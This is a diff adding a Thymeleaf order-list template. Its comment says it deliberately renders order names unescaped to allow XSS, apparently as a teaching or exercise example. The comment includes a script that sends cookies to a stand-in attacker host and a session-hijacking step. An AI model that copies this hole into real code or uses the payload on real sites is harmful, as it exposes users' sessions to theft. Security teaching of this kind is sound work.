@@ -1,0 +1,37 @@
+<!DOCTYPE HTML>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+    <head>
+        <title>Orders</title>
+        <meta charset="UTF-8" />
+    </head>
+    <body>
+
+        <header th:replace="fragments/header :: header">
+            <p>header with links etc</p>
+        </header>
+
+        <h2>Past orders sent to ..</h2>
+
+        <ul>
+            <!-- The modification is to output the order name *unescaped* allowing XSS -->
+            <!-- Malicious user could input an order with script
+
+             <script>fetch('http://malicioussite.com', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'text/plain'
+                },
+                body: document.cookie
+              });</script>
+
+              This sends the cookie to the attacker's end point sending the session id with all other cookies.
+              Attacker can then use this id to create a session with name JSESSION and the sent value to hijack
+              the session, for example simply with
+
+              document.cookie = 'JSESSIONID=495133930B8D3C2291E1DAE5CB45D279'
+             -->
+            <li th:each="order : ${orders}" th:utext="${order.name}">user name</li>
+        </ul>
+
+    </body>
+</html>
